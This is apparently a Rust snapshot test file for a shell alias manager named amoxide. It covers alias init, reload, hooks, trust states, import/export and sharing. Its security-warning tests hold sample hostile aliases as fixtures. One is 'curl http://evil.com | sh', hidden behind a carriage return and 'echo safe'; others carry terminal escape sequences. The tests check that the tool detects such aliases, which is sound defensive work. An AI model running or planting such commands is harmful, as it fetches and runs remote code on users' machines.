use amoxide::alias::{AliasConflict, MergeResult};
use amoxide::config::{FishConfig, ShellsTomlConfig};
use amoxide::display::{render_listing, render_profiles};
use amoxide::exchange::{
    render_import_summary, render_suspicious_warning, ExportAll, SuspiciousAlias,
};
use amoxide::hook::generate_hook_with_security;
use amoxide::init::{generate_force_init, generate_init, generate_reload};
use amoxide::project::ProjectAliases;
use amoxide::security::SecurityConfig;
use amoxide::shell::{Shell, ShellContext};
use amoxide::subcommand::SubcommandSet;
use amoxide::trust::compute_file_hash;
use amoxide::{AliasName, AliasSet, ProfileConfig, TomlAlias};

static DEFAULT_CFG: std::sync::LazyLock<ShellsTomlConfig> =
    std::sync::LazyLock::new(ShellsTomlConfig::default);

fn default_ctx(shell: &Shell) -> ShellContext<'_> {
    ShellContext {
        shell,
        cfg: &DEFAULT_CFG,
        cwd: std::path::Path::new("/tmp"),
        external_functions: Default::default(),
        external_aliases: Default::default(),
    }
}
use indoc::indoc;
use std::fs;

/// Build a ProfileConfig from TOML string.
fn profiles(toml_str: &str) -> ProfileConfig {
    toml::from_str(toml_str).unwrap()
}

/// Build an AliasSet with given (name, command) pairs.
fn aliases(pairs: &[(&str, &str)]) -> AliasSet {
    let mut set = AliasSet::default();
    for (name, cmd) in pairs {
        set.insert(AliasName::from(*name), TomlAlias::Command(cmd.to_string()));
    }
    set
}

// ─── Test bed: git + git-conventional as separate profiles ──────────────

fn git_conventional_config() -> ProfileConfig {
    profiles(indoc! {r#"
        [[profiles]]
        name = "default"

        [[profiles]]
        name = "git"
        [profiles.aliases]
        gs = "git status"
        cm = "git commit -sm"

        [[profiles]]
        name = "git-conventional"
        [profiles.aliases]
        cmf = "cm feat: {{@}}"
    "#})
}

// ─── Test bed: base, git, rust as separate profiles ─────────────────────

fn deep_chain_config() -> ProfileConfig {
    profiles(indoc! {r#"
        [[profiles]]
        name = "base"
        [profiles.aliases]
        ll = "ls -lha"

        [[profiles]]
        name = "git"
        [profiles.aliases]
        gs = "git status"

        [[profiles]]
        name = "rust"
        [profiles.aliases]
        ct = "cargo test"
    "#})
}

// ═══════════════════════════════════════════════════════════════════════
// Init snapshots
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_init_fish_simple_profile() {
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "default"
        [profiles.aliases]
        ll = "ls -lha"
        gs = "git status"
    "#});
    let resolved = config.resolve_active_aliases(&["default"]);
    let output = generate_init(
        &default_ctx(&Shell::Fish),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_zsh_simple_profile() {
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "default"
        [profiles.aliases]
        ll = "ls -lha"
        gs = "git status"
    "#});
    let resolved = config.resolve_active_aliases(&["default"]);
    let output = generate_init(
        &default_ctx(&Shell::Zsh),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_powershell_simple_profile() {
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "default"
        [profiles.aliases]
        ll = "ls -lha"
        gs = "git status"
    "#});
    let resolved = config.resolve_active_aliases(&["default"]);
    let output = generate_init(
        &default_ctx(&Shell::Powershell),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_bash_simple_profile() {
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "default"
        [profiles.aliases]
        ll = "ls -lha"
        gs = "git status"
    "#});
    let resolved = config.resolve_active_aliases(&["default"]);
    let output = generate_init(
        &default_ctx(&Shell::Bash),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_fish_multi_profile() {
    let config = git_conventional_config();
    let resolved = config.resolve_active_aliases(&["git", "git-conventional"]);
    let output = generate_init(
        &default_ctx(&Shell::Fish),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_fish_with_globals() {
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "rust"
        [profiles.aliases]
        ct = "cargo test"
    "#});
    let globals = aliases(&[("ll", "ls -lha")]);
    let resolved = config.resolve_active_aliases(&["rust"]);
    let output = generate_init(
        &default_ctx(&Shell::Fish),
        &globals,
        &resolved,
        &SubcommandSet::new(),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_fish_deep_chain() {
    let config = deep_chain_config();
    let resolved = config.resolve_active_aliases(&["base", "git", "rust"]);
    let output = generate_init(
        &default_ctx(&Shell::Fish),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_fish_with_simple_subcommands() {
    let globals = aliases(&[("gs", "git status")]);
    let mut subcommands = SubcommandSet::new();
    subcommands.insert("jj:ab".into(), vec!["abandon".into()]);
    subcommands.insert("jj:new".into(), vec!["new --no-edit".into()]);
    let output = generate_init(
        &default_ctx(&Shell::Fish),
        &globals,
        &AliasSet::default(),
        &subcommands,
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_bash_with_kubectl_subcommands() {
    let mut subcommands = SubcommandSet::new();
    subcommands.insert("kubectl:get:po".into(), vec!["get".into(), "pods".into()]);
    subcommands.insert(
        "kubectl:get:svc".into(),
        vec!["get".into(), "services".into()],
    );
    subcommands.insert("kubectl:apply:f".into(), vec!["apply".into(), "-f".into()]);
    subcommands.insert(
        "kubectl:rollout:status".into(),
        vec!["rollout".into(), "status".into()],
    );
    subcommands.insert("kubectl:logs:f".into(), vec!["logs".into(), "-f".into()]);
    let output = generate_init(
        &default_ctx(&Shell::Bash),
        &AliasSet::default(),
        &AliasSet::default(),
        &subcommands,
    );
    insta::assert_snapshot!(output);
}

// ═══════════════════════════════════════════════════════════════════════
// Reload snapshots
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_reload_fish_switch_profile() {
    let config = git_conventional_config();
    let resolved = config.resolve_active_aliases(&["git", "git-conventional"]);
    let output = generate_reload(
        &default_ctx(&Shell::Fish),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
        Some("gs,cm"),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_reload_zsh_switch_profile() {
    let config = git_conventional_config();
    let resolved = config.resolve_active_aliases(&["git", "git-conventional"]);
    let output = generate_reload(
        &default_ctx(&Shell::Zsh),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
        Some("gs,cm"),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_reload_powershell_switch_profile() {
    let config = git_conventional_config();
    let resolved = config.resolve_active_aliases(&["git-conventional"]);
    let output = generate_reload(
        &default_ctx(&Shell::Powershell),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
        Some("gs,cm"),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_reload_bash_switch_profile() {
    let config = git_conventional_config();
    let resolved = config.resolve_active_aliases(&["git", "git-conventional"]);
    let output = generate_reload(
        &default_ctx(&Shell::Bash),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
        Some("gs,cm"),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_reload_fish_after_global_add() {
    // Simulates: user had profile aliases loaded, then adds a global alias
    let globals = aliases(&[("ll", "ls -lha")]);
    let config = git_conventional_config();
    let resolved = config.resolve_active_aliases(&["git", "git-conventional"]);
    let output = generate_reload(
        &default_ctx(&Shell::Fish),
        &globals,
        &resolved,
        &SubcommandSet::new(),
        Some("cm,cmf,gs"), // previously tracked aliases
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_reload_fish_globals_only_no_profile() {
    // No active profile, only globals
    let globals = aliases(&[("ll", "ls -lha"), ("gs", "git status")]);
    let output = generate_reload(
        &default_ctx(&Shell::Fish),
        &globals,
        &AliasSet::default(),
        &SubcommandSet::new(),
        Some("old"),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_reload_zsh_after_global_add() {
    let globals = aliases(&[("ll", "ls -lha")]);
    let config = git_conventional_config();
    let resolved = config.resolve_active_aliases(&["git", "git-conventional"]);
    let output = generate_reload(
        &default_ctx(&Shell::Zsh),
        &globals,
        &resolved,
        &SubcommandSet::new(),
        Some("cm,cmf,gs"),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_reload_bash_after_global_add() {
    let globals = aliases(&[("ll", "ls -lha")]);
    let config = git_conventional_config();
    let resolved = config.resolve_active_aliases(&["git", "git-conventional"]);
    let output = generate_reload(
        &default_ctx(&Shell::Bash),
        &globals,
        &resolved,
        &SubcommandSet::new(),
        Some("cm,cmf,gs"),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_fish_globals_and_multi_profile() {
    // Full scenario: globals + multiple active profiles
    let globals = aliases(&[("ll", "ls -lha")]);
    let config = git_conventional_config();
    let resolved = config.resolve_active_aliases(&["git", "git-conventional"]);
    let output = generate_init(
        &default_ctx(&Shell::Fish),
        &globals,
        &resolved,
        &SubcommandSet::new(),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_reload_after_profile_removed() {
    // Scenario: rust profile had its own aliases, then was removed from active set
    // Now only git's aliases should remain
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "git"
        [profiles.aliases]
        gs = "git status"
        cm = "git commit -sm"

        [[profiles]]
        name = "rust"
        [profiles.aliases]
        ct = "cargo test"
    "#});
    // rust is no longer in the active set
    let resolved = config.resolve_active_aliases(&["git"]);
    // Previously tracked: cm,ct,gs (git's + rust's aliases were all loaded)
    let output = generate_reload(
        &default_ctx(&Shell::Fish),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
        Some("cm,ct,gs"),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_reload_after_parent_profile_removed() {
    // Scenario: git was removed, git-conventional is now standalone
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "git-conventional"
        [profiles.aliases]
        cmf = "cm feat: {{@}}"
    "#});
    // git was removed, only git-conventional active
    let resolved = config.resolve_active_aliases(&["git-conventional"]);
    // Previously tracked: cm,cmf,gs (git's + git-conventional's were loaded)
    let output = generate_reload(
        &default_ctx(&Shell::Fish),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
        Some("cm,cmf,gs"),
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_reload_after_active_set_changed() {
    // Scenario: previously had git+rust active, now changed to base+rust
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "base"
        [profiles.aliases]
        ll = "ls -lha"

        [[profiles]]
        name = "git"
        [profiles.aliases]
        gs = "git status"

        [[profiles]]
        name = "rust"
        [profiles.aliases]
        ct = "cargo test"
    "#});
    let resolved = config.resolve_active_aliases(&["base", "rust"]);
    // Previously tracked: ct,gs (from rust + git)
    // Now should have: ct,ll (from rust + base)
    let output = generate_reload(
        &default_ctx(&Shell::Fish),
        &AliasSet::default(),
        &resolved,
        &SubcommandSet::new(),
        Some("ct,gs"),
    );
    insta::assert_snapshot!(output);
}

// ═══════════════════════════════════════════════════════════════════════
// Hook snapshots
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_hook_fish_with_aliases() {
    let dir = tempfile::tempdir().unwrap();
    let aliases_path = dir.path().join(".aliases");
    fs::write(
        &aliases_path,
        indoc! {r#"
            [aliases]
            t = "cargo test"
            b = "cargo build"
        "#},
    )
    .unwrap();

    let mut security = SecurityConfig::default();
    let hash = compute_file_hash(&aliases_path).unwrap();
    security.trust(&aliases_path, &hash);

    let ctx = ShellContext {
        shell: &Shell::Fish,
        cfg: &DEFAULT_CFG,
        cwd: dir.path(),
        external_functions: Default::default(),
        external_aliases: Default::default(),
    };
    let (output, _) = generate_hook_with_security(&ctx, None, None, &mut security, false, &AliasSet::default()).unwrap();
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_hook_zsh_with_aliases() {
    let dir = tempfile::tempdir().unwrap();
    let aliases_path = dir.path().join(".aliases");
    fs::write(
        &aliases_path,
        indoc! {r#"
            [aliases]
            t = "cargo test"
            b = "cargo build"
        "#},
    )
    .unwrap();

    let mut security = SecurityConfig::default();
    let hash = compute_file_hash(&aliases_path).unwrap();
    security.trust(&aliases_path, &hash);

    let ctx = ShellContext {
        shell: &Shell::Zsh,
        cfg: &DEFAULT_CFG,
        cwd: dir.path(),
        external_functions: Default::default(),
        external_aliases: Default::default(),
    };
    let (output, _) = generate_hook_with_security(&ctx, None, None, &mut security, false, &AliasSet::default()).unwrap();
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_hook_powershell_with_aliases() {
    let dir = tempfile::tempdir().unwrap();
    let aliases_path = dir.path().join(".aliases");
    fs::write(
        &aliases_path,
        indoc! {r#"
            [aliases]
            t = "cargo test"
            b = "cargo build"
        "#},
    )
    .unwrap();

    let mut security = SecurityConfig::default();
    let hash = compute_file_hash(&aliases_path).unwrap();
    security.trust(&aliases_path, &hash);

    let ctx = ShellContext {
        shell: &Shell::Powershell,
        cfg: &DEFAULT_CFG,
        cwd: dir.path(),
        external_functions: Default::default(),
        external_aliases: Default::default(),
    };
    let (output, _) = generate_hook_with_security(&ctx, None, None, &mut security, false, &AliasSet::default()).unwrap();
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_hook_bash_with_aliases() {
    let dir = tempfile::tempdir().unwrap();
    let aliases_path = dir.path().join(".aliases");
    fs::write(
        &aliases_path,
        indoc! {r#"
            [aliases]
            t = "cargo test"
            b = "cargo build"
        "#},
    )
    .unwrap();

    let mut security = SecurityConfig::default();
    let hash = compute_file_hash(&aliases_path).unwrap();
    security.trust(&aliases_path, &hash);

    let ctx = ShellContext {
        shell: &Shell::Bash,
        cfg: &DEFAULT_CFG,
        cwd: dir.path(),
        external_functions: Default::default(),
        external_aliases: Default::default(),
    };
    let (output, _) = generate_hook_with_security(&ctx, None, None, &mut security, false, &AliasSet::default()).unwrap();
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_hook_fish_transition() {
    let dir = tempfile::tempdir().unwrap();
    let aliases_path = dir.path().join(".aliases");
    fs::write(
        &aliases_path,
        indoc! {r#"
            [aliases]
            t = "make test"
        "#},
    )
    .unwrap();

    let mut security = SecurityConfig::default();
    let hash = compute_file_hash(&aliases_path).unwrap();
    security.trust(&aliases_path, &hash);

    let ctx = ShellContext {
        shell: &Shell::Fish,
        cfg: &DEFAULT_CFG,
        cwd: dir.path(),
        external_functions: Default::default(),
        external_aliases: Default::default(),
    };
    let (output, _) =
        generate_hook_with_security(&ctx, Some("old_a,old_b"), None, &mut security, false, &AliasSet::default()).unwrap();
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_hook_fish_leaving_project() {
    let dir = tempfile::tempdir().unwrap();
    // No .aliases file
    let mut security = SecurityConfig::default();
    let ctx = ShellContext {
        shell: &Shell::Fish,
        cfg: &DEFAULT_CFG,
        cwd: dir.path(),
        external_functions: Default::default(),
        external_aliases: Default::default(),
    };
    let (output, _) =
        generate_hook_with_security(&ctx, Some("old_a,old_b"), None, &mut security, false, &AliasSet::default()).unwrap();
    insta::assert_snapshot!(output);
}

// ═══════════════════════════════════════════════════════════════════════
// Display snapshots
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_display_profile_list() {
    let config = git_conventional_config();
    let output = render_profiles(&config, &["git-conventional".to_string()]);
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_display_multi_active() {
    let config = deep_chain_config();
    let output = render_profiles(&config, &["base".to_string(), "rust".to_string()]);
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_display_listing_with_globals_and_project() {
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "rust"
        [profiles.aliases]
        ct = "cargo test"
    "#});
    let globals = aliases(&[("ll", "ls -lha")]);

    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join(".aliases");
    fs::write(
        &path,
        indoc! {r#"
            [aliases]
            b = "make build"
        "#},
    )
    .unwrap();
    let project = ProjectAliases::load(&path).unwrap();

    let trust =
        amoxide::trust::ProjectTrust::Trusted(project, std::path::PathBuf::from(".aliases"));
    let output = render_listing(
        &globals,
        &SubcommandSet::new(),
        &config,
        &["rust".to_string()],
        Some(&trust),
        None,
    );
    insta::assert_snapshot!(output);
}

// ═══════════════════════════════════════════════════════════════════════
// Trust state listing snapshots
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_listing_unknown_project() {
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "rust"
        [profiles.aliases]
        ct = "cargo test"
    "#});

    let trust = amoxide::trust::ProjectTrust::Unknown(std::path::PathBuf::from(
        "/path/to/project/.aliases",
    ));

    let output = render_listing(
        &AliasSet::default(),
        &SubcommandSet::new(),
        &config,
        &["rust".to_string()],
        Some(&trust),
        None,
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_listing_tampered_project() {
    let trust = amoxide::trust::ProjectTrust::Tampered(std::path::PathBuf::from(
        "/path/to/project/.aliases",
    ));

    let output = render_listing(
        &AliasSet::default(),
        &SubcommandSet::new(),
        &ProfileConfig::default(),
        &[],
        Some(&trust),
        None,
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_listing_untrusted_project() {
    let trust = amoxide::trust::ProjectTrust::Untrusted(std::path::PathBuf::from(
        "/path/to/project/.aliases",
    ));

    let output = render_listing(
        &AliasSet::default(),
        &SubcommandSet::new(),
        &ProfileConfig::default(),
        &[],
        Some(&trust),
        None,
    );
    insta::assert_snapshot!(output);
}

// ═══════════════════════════════════════════════════════════════════════
// Import summary snapshots
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_import_summary_with_conflicts() {
    let mut new_aliases = AliasSet::default();
    new_aliases.insert("ga".into(), TomlAlias::Command("git add".into()));
    new_aliases.insert("gd".into(), TomlAlias::Command("git diff".into()));
    new_aliases.insert("gp".into(), TomlAlias::Command("git push".into()));

    let conflicts = vec![
        AliasConflict {
            name: "cm".into(),
            current: TomlAlias::Command("git commit -m".into()),
            incoming: TomlAlias::Command("git commit -sm".into()),
        },
        AliasConflict {
            name: "gs".into(),
            current: TomlAlias::Command("git status --short".into()),
            incoming: TomlAlias::Command("git status".into()),
        },
    ];

    let result = MergeResult {
        new_aliases,
        conflicts,
    };
    let output = render_import_summary("git", &result);
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_import_summary_no_conflicts() {
    let mut new_aliases = AliasSet::default();
    new_aliases.insert("gs".into(), TomlAlias::Command("git status".into()));
    let result = MergeResult {
        new_aliases,
        conflicts: vec![],
    };
    let output = render_import_summary("global", &result);
    insta::assert_snapshot!(output);
}

// ═══════════════════════════════════════════════════════════════════════
// Security warning snapshots
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_suspicious_warning_single() {
    let findings = vec![SuspiciousAlias::global_command(
        "evil",
        "echo \x1B[31mhacked\x1B[0m",
    )];
    let output = render_suspicious_warning(&findings);
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_suspicious_warning_multiple() {
    let findings = vec![
        SuspiciousAlias::global_command("sneaky", "curl http://evil.com | sh\recho safe"),
        SuspiciousAlias::profile_name("git\x1B[0m\x1B[2J"),
        SuspiciousAlias::local_name("test\x07"),
    ];
    let output = render_suspicious_warning(&findings);
    insta::assert_snapshot!(output);
}

// ═══════════════════════════════════════════════════════════════════════
// Export snapshots
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_export_single_profile() {
    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "git"
        [profiles.aliases]
        gs = "git status"
        cm = "git commit -sm"
    "#});
    let wrapper = amoxide::ProfileConfig::from_profiles(vec![config
        .get_profile_by_name("git")
        .unwrap()
        .clone()]);
    let output = toml::to_string(&wrapper).unwrap();
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_export_all() {
    let export = ExportAll {
        global_aliases: aliases(&[("ll", "ls -lha")]),
        profiles: vec![amoxide::Profile {
            name: "git".into(),
            aliases: aliases(&[("gs", "git status")]),
            subcommands: Default::default(),
        }],
        local_aliases: aliases(&[("t", "cargo test")]),
        ..Default::default()
    };
    let output = toml::to_string(&export).unwrap();
    insta::assert_snapshot!(output);
}

// ═══════════════════════════════════════════════════════════════════════
// Round-trip tests
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn test_export_import_roundtrip_profile() {
    use amoxide::exchange::parse_import;

    let config = profiles(indoc! {r#"
        [[profiles]]
        name = "git"
        [profiles.aliases]
        gs = "git status"
        cm = "git commit -sm"
    "#});

    let wrapper = amoxide::ProfileConfig::from_profiles(vec![config
        .get_profile_by_name("git")
        .unwrap()
        .clone()]);
    let exported = toml::to_string(&wrapper).unwrap();
    let parsed = parse_import(&exported).unwrap();
    assert_eq!(parsed.profiles.len(), 1);
    assert_eq!(parsed.profiles[0].name, "git");
    assert_eq!(parsed.profiles[0].aliases.len(), 2);
}

#[test]
fn test_export_import_roundtrip_all() {
    use amoxide::exchange::{parse_import, ExportAll};

    let export = ExportAll {
        global_aliases: aliases(&[("ll", "ls -lha")]),
        profiles: vec![amoxide::Profile {
            name: "git".into(),
            aliases: aliases(&[("gs", "git status")]),
            subcommands: Default::default(),
        }],
        local_aliases: aliases(&[("t", "cargo test")]),
        ..Default::default()
    };

    let exported = toml::to_string(&export).unwrap();
    let parsed = parse_import(&exported).unwrap();
    assert_eq!(parsed.global_aliases.len(), 1);
    assert_eq!(parsed.profiles.len(), 1);
    assert_eq!(parsed.local_aliases.len(), 1);
}

#[test]
fn test_base64_export_import_roundtrip() {
    use amoxide::exchange::{base64_decode, base64_encode, parse_import, ExportAll};

    let export = ExportAll {
        global_aliases: aliases(&[("ll", "ls -lha")]),
        ..Default::default()
    };

    let toml_str = toml::to_string(&export).unwrap();
    let encoded = base64_encode(&toml_str);
    let decoded = base64_decode(&encoded).unwrap();
    let parsed = parse_import(&decoded).unwrap();
    assert_eq!(parsed.global_aliases.len(), 1);
}

// ═══════════════════════════════════════════════════════════════════════
// Message::Import integration tests
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn test_import_payload_through_update() {
    use amoxide::config::Config;
    use amoxide::exchange::ImportPayload;
    use amoxide::update::{update, AppModel};

    let config = Config::default();
    let profile_config = profiles(indoc! {r#"
        [[profiles]]
        name = "git"
        [profiles.aliases]
        gs = "git status"
    "#});

    let mut model = AppModel::new(config, profile_config);

    let payload = ImportPayload {
        global_aliases: Some(aliases(&[("ll", "ls -lha")])),
        profiles: vec![amoxide::Profile {
            name: "git".into(),
            aliases: aliases(&[("gp", "git push")]),
            subcommands: Default::default(),
        }],
        ..Default::default()
    };

    let result = update(&mut model, amoxide::Message::Import(payload)).unwrap();
    // Should have SaveConfig + SaveProfiles effects
    assert!(!result.effects.is_empty());

    assert_eq!(model.config.aliases.len(), 1);
    let git = model.profile_config().get_profile_by_name("git").unwrap();
    assert_eq!(git.aliases.len(), 2); // gs + gp
}

#[test]
fn test_import_payload_global_only_no_save_profiles() {
    use amoxide::config::Config;
    use amoxide::effects::Effect;
    use amoxide::exchange::ImportPayload;
    use amoxide::update::{update, AppModel};

    let config = Config::default();
    let profile_config = profiles(indoc! {r#"
        [[profiles]]
        name = "git"
    "#});

    let mut model = AppModel::new(config, profile_config);

    let payload = ImportPayload {
        global_aliases: Some(aliases(&[("ll", "ls -lha")])),
        ..Default::default()
    };

    let result = update(&mut model, amoxide::Message::Import(payload)).unwrap();
    // Only SaveConfig, no SaveProfiles (no profiles imported)
    assert_eq!(result.effects, vec![Effect::SaveConfig]);
    assert!(result.next.is_none());
    assert_eq!(model.config.aliases.len(), 1);
}

// ═══════════════════════════════════════════════════════════════════════
// Share command snapshots
// ═══════════════════════════════════════════════════════════════════════

#[test]
fn snapshot_share_termbin_profile() {
    use amoxide::cli::{ScopeArgs, ShareArgs};
    use amoxide::import_export::handle_share;

    let args = ShareArgs {
        scope: ScopeArgs {
            local: false,
            global: false,
            profile: vec!["git".into()],
            all: false,
        },
        termbin: true,
        paste_rs: false,
    };
    let output = handle_share(&args);
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_share_paste_rs_all() {
    use amoxide::cli::{ScopeArgs, ShareArgs};
    use amoxide::import_export::handle_share;

    let args = ShareArgs {
        scope: ScopeArgs {
            local: false,
            global: false,
            profile: vec![],
            all: true,
        },
        termbin: false,
        paste_rs: true,
    };
    let output = handle_share(&args);
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_share_help() {
    use amoxide::cli::{ScopeArgs, ShareArgs};
    use amoxide::import_export::handle_share;

    let args = ShareArgs {
        scope: ScopeArgs {
            local: false,
            global: false,
            profile: vec![],
            all: false,
        },
        termbin: false,
        paste_rs: false,
    };
    let output = handle_share(&args);
    insta::assert_snapshot!(output);
}

fn abbr_ctx(shell: &Shell) -> ShellContext<'_> {
    static ABBR_CFG: std::sync::LazyLock<ShellsTomlConfig> =
        std::sync::LazyLock::new(|| ShellsTomlConfig {
            fish: Some(FishConfig { use_abbr: true }),
        });
    ShellContext {
        shell,
        cfg: &ABBR_CFG,
        cwd: std::path::Path::new("/tmp"),
        external_functions: Default::default(),
        external_aliases: Default::default(),
    }
}

#[test]
fn snapshot_init_fish_force_with_tracked_aliases() {
    // Simulates: _AM_ALIASES=gs,ll is set, user runs am init --force fish.
    // force_unalias must emit both cleanup forms for each tracked name,
    // followed by the normal init output.
    let prev_names = vec!["gs".to_string(), "ll".to_string()];
    let output = generate_force_init(
        &default_ctx(&Shell::Fish),
        &aliases(&[("gs", "git status"), ("ll", "ls -lha")]),
        &AliasSet::default(),
        &SubcommandSet::new(),
        &prev_names,
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_fish_abbr_force_with_tracked_aliases() {
    // Same but with use_abbr = true — cleanup must still emit both forms.
    let prev_names = vec!["gs".to_string()];
    let output = generate_force_init(
        &abbr_ctx(&Shell::Fish),
        &aliases(&[("gs", "git status")]),
        &AliasSet::default(),
        &SubcommandSet::new(),
        &prev_names,
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_fish_force_no_previous() {
    // --force with no tracked aliases: no cleanup lines, just normal init.
    let output = generate_force_init(
        &default_ctx(&Shell::Fish),
        &aliases(&[("gs", "git status")]),
        &AliasSet::default(),
        &SubcommandSet::new(),
        &[],
    );
    insta::assert_snapshot!(output);
}

#[test]
fn snapshot_init_bash_force_with_tracked_aliases() {
    let prev_names = vec!["gs".to_string()];
    let output = generate_force_init(
        &default_ctx(&Shell::Bash),
        &aliases(&[("gs", "git status")]),
        &AliasSet::default(),
        &SubcommandSet::new(),
        &prev_names,
    );
    insta::assert_snapshot!(output);
}

#[test]
fn sync_fresh_load_emits_aliases_and_env_var() {
    use amoxide::precedence::{render_diff, Precedence};
    let aliases = aliases(&[("gs", "git status")]);
    let diff = Precedence::new()
        .with_profiles(&aliases, &SubcommandSet::new())
        .resolve();
    let shell = Shell::Fish.as_shell(&Default::default(), Default::default(), Default::default());
    let out = render_diff(&diff, shell.as_ref());
    assert!(out.contains("alias gs \"git status\""));
    assert!(out.contains("_AM_ALIASES"));
    assert!(out.contains("gs|"));
}
